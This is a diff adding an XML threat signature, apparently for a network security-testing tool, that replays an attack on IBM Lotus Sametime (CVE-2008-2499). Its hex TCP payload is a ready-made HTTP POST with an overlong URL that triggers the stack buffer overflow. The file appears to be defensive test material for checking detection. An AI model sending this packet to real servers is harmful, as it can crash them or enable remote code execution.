@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Lotus Sametime Server Multiplexer Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A stack-based buffer overflow vulnerability exists in the Community Services Multiplexer component of IBM Lotus Sametime. The vulnerability is the result of a boundary-check error during parsing of long URLs by the Community Services Multiplexer. A remote unauthenticated attacker can exploit this vulnerability for code execution by sending a specially crafted HTTP request to the target server. Any code injected using this vulnerability would be execution within the security context of the affected process, normally System."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_IBM_Lotus_Sametime"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20080521-20"/>
+    <CVEID display="true" value="CVE-2008-2499"/>
+    <bugtraqID display="true" value="29328"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="f8fcbbfaa063a2b33df87b93e2f3f3a6"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633601814063437500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216834772" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01AE" Identification="D577" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="0227" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="D9D40354" AckNumber="B08BCF35" HeaderLength="08" WindowSize="05B4" Checksum="E31E" UrgentPointer="0000" Options="0101080AE88DD62600000000" Payload="504F5354202F436F6D6D756E6974794342522F43432E33392E434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343432F0D0A486F73743A203137322E31362E382E3133373A313533330D0A436F6E74656E742D4C656E6774683A20340D0A436F6E6E656374696F6E3A20436C6F73650D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A0D0A64617461" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
